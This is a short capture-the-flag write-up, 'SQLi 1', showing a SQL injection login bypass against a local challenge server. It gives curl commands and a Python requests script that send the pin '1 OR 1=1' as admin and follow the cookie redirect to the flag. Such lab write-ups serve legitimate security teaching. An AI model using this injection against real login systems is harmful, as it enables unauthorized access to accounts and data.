# SQLi 1

#### First run a request to see what’s happening:

```curl -v -d “userid=guest&pin=1337” http://challenge.localhost:80/gateway```

--------------------------------------------------

#### After running the request, it issues a cookie and says it should be redirected. After trying to follow the redirects by rerunning the code with “-L” it caused an infinite loop, meaning it’s expecting the cookie on the redirecting POST request. So lets copy the cookie:

```curl -c cookie -d “userid=admin&pin=1 OR 1=1” http://challenge.localhost:80/gateway```

----------------------------------------------------

#### Then use the cookie to follow the redirect to the flag:

```curl -L -b cookie “http://challenge.localhost:80/gateway```

-----------------------------------------------

#### Or the python version, set it up to be reusable:
``` python
import requests

path = “/gateway”
url = f”http://challenge.localhost{path}”

data = {
“userid”: “admin”,
“pin”: “1 or 1=1”
}

response = requests.post(url=url, data=data)
print(response.text)
```
```python3 requesting.py```

------------------------------------------------

#### Or in terminal:

```Python```
```
>>> import requests
>>> url = "http://challenge.localhost/gateway"
>>> data = {"userid":"admin", "pin":"1 or 1=1"}
>>> r = requests.post(url=url, data=data)
>>> print(r.text)
```
